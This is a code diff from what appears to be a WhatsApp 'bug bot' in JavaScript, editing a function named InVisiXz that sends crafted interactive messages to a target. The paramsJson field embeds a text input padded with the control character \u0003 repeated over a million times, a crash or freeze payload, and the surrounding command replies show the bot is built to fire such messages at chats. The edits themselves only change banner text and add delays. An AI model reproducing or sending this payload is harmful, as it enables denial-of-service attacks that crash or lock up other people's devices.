@@ -380,7 +380,7 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 									hasMediaAttachment: true
 								},
 								body: {
-									text: "⭑̤⟅̊༑ ▾ 𝐃𝐄𝐕𝐈𝐋 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
+									text:  "⭑̤‏‎‏Holla Bro"
 								},
 								nativeFlowMessage: {
 									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
@@ -644,7 +644,7 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 					},
 					"nativeFlowResponseMessage": {
 						"name": "galaxy_message",
-						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐃𝐄𝐕𝐈𝐋 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑⟆̊‏‎${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
 						"version": 3
 					}
 				}
@@ -1015,6 +1015,7 @@ reply(`
 ┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
 ┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
 ┗━━━━━━━━━━━━━━━━━━━━━`)
+await sleep(2000)
 await sam.sendMessage(m.chat, {
 audio: bugaudio,
 mimetype: 'audio/mpeg'
@@ -1046,7 +1047,7 @@ reply(`
 ┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
 ┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
 ┗━━━━━━━━━━━━━━━━━━━━━`)
-await (2000)
+await sleep(2000)
 await sam.sendMessage(m.chat, {
 audio: bugaudio,
 mimetype: 'audio/mpeg'
